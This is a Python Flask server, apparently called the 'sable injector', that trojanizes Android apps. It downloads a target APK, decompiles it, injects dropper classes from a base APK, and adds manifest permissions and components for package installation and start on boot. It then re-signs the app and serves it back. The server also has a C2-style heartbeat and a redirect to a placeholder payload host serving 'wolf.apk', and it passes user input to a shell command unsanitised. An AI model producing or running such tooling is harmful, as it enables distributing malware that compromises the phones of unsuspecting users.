import os
import subprocess
import shutil
import tempfile
from flask import Flask, request, send_file, jsonify, redirect

app = Flask(__name__)

WORK = tempfile.mkdtemp()
KEYSTORE = "keystore.jks"
DROPPER = "dropper_base.apk"

@app.route("/")
def home():
    return "sable injector alive"

@app.route("/inject", methods=["POST"])
def inject():
    data = request.json or {}
    file_url = data.get("apk_url")

    if not file_url:
        return jsonify({"error": "apk_url required"}), 400

    target = os.path.join(WORK, "target.apk")
    subprocess.run(f"wget -q -O {target} '{file_url}'", shell=True)

    target_dir = os.path.join(WORK, "target")
    shutil.rmtree(target_dir, ignore_errors=True)
    subprocess.run(f"apktool d -f -o {target_dir} {target}", shell=True)

    dropper_dir = os.path.join(WORK, "dropper")
    shutil.rmtree(dropper_dir, ignore_errors=True)
    subprocess.run(f"apktool d -f -o {dropper_dir} {DROPPER}", shell=True)

    src_smali = os.path.join(dropper_dir, "smali", "com", "sable", "dropper")
    dst_smali = os.path.join(target_dir, "smali", "com", "sable", "dropper")
    if os.path.exists(src_smali):
        shutil.copytree(src_smali, dst_smali, dirs_exist_ok=True)

    merge_manifest(
        os.path.join(target_dir, "AndroidManifest.xml"),
        os.path.join(dropper_dir, "AndroidManifest.xml")
    )

    unsigned = os.path.join(WORK, "unsigned.apk")
    subprocess.run(f"apktool b -f -o {unsigned} {target_dir}", shell=True)

    aligned = os.path.join(WORK, "aligned.apk")
    signed = os.path.join(WORK, "signed.apk")
    subprocess.run(f"zipalign -f -p 4 {unsigned} {aligned}", shell=True)
    subprocess.run(
        f"apksigner sign --ks {KEYSTORE} --ks-pass pass:sable123 "
        f"--key-pass pass:sable123 --out {signed} {aligned}",
        shell=True
    )

    return send_file(signed, as_attachment=True, download_name="injected.apk")

def merge_manifest(target_path, dropper_path):
    with open(target_path) as f:
        t = f.read()

    perms = [
        "android.permission.INTERNET",
        "android.permission.REQUEST_INSTALL_PACKAGES",
        "android.permission.RECEIVE_BOOT_COMPLETED",
        "android.permission.WAKE_LOCK",
    ]
    insert = "".join(f'<uses-permission android:name="{p}"/>' for p in perms if p not in t)
    if insert:
        t = t.replace("</application>", insert + "</application>")

    components = """
        <service android:name="com.sable.dropper.DropperService" android:exported="false"/>
        <receiver android:name="com.sable.dropper.InstallReceiver" android:exported="true"/>
        <receiver android:name="com.sable.dropper.BootReceiver" android:exported="true">
            <intent-filter><action android:name="android.intent.action.BOOT_COMPLETED"/></intent-filter>
        </receiver>
        <activity android:name="com.sable.dropper.MainActivity" android:exported="true"/>
    """
    t = t.replace("</application>", components + "</application>")

    with open(target_path, "w") as f:
        f.write(t)

@app.route("/hb", methods=["POST"])
def heartbeat():
    return jsonify({"status": "ok", "next_check": 7200})

@app.route("/payload")
def payload():
    return redirect("https://your-payload-host.com/wolf.apk")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
